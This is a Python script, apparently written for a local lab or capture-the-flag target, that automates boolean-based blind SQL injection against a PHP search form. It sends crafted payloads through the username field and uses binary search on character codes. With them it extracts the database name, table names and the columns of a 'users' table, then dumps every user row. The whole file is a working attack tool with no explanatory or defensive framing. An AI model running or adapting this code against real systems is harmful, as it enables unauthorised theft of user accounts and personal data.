import requests

URL = "http://127.0.0.1:8080/search.php"
COOKIES = {"PHPSESSID": "98894d5dd6e8b65b0ad585865055336a"}
req_count = 0

def test_query(payload):
    global req_count
    req_count += 1
    data = {"username": payload}
    try:
        r = requests.post(URL, data=data, cookies=COOKIES, timeout=2)
        return "No results" not in r.text
    except:
        return False

def get_char(query, pos):
    """Binary search for char"""
    l, h = 32, 126
    while l <= h:
        m = (l + h) // 2
        if test_query(f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{m}-- "):
            l = m + 1
        else:
            h = m - 1
    if l <= 126 and test_query(f"' AND ASCII(SUBSTRING(({query}),{pos},1))={l}-- "):
        return chr(l)
    return None

def get_str(query, max_l=30):
    s = ""
    for i in range(1, max_l + 1):
        c = get_char(query, i)
        if not c or ord(c) < 32:
            break
        s += c
    return s

print("[+] Blind SQLi - Extracting data\n")

# Database
print("[1] Database:")
db = get_str("SELECT database()", 15)
print(f"    {db}")

# Tables
print("\n[2] Tables:")
for i in range(3):  # Check first 3 tables
    t = get_str(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {i},1", 15)
    if t:
        print(f"    {t}")

# Columns
print("\n[3] Columns in 'users':")
cols = []
for i in range(5):  # Check first 5 columns
    c = get_str(f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='users' LIMIT {i},1", 15)
    if c:
        cols.append(c)
        print(f"    {c}")

# Count rows
print("\n[4] Counting rows:")
for n in range(1, 15):
    if test_query(f"' AND (SELECT COUNT(*) FROM users)={n}-- "):
        print(f"    {n} rows")
        rows = n
        break

# Extract users
print("\n[5] Extracting users:\n")
for row in range(rows):
    print(f"User {row+1}:")
    for col in cols:
        val = get_str(f"SELECT {col} FROM users LIMIT {row},1", 50)
        print(f"  {col}: {val}")
        if 'beta' in val.lower():
            print(f"  >>> BETA USER FOUND <<<")
    print()

print(f"\n[+] Total requests: {req_count}")

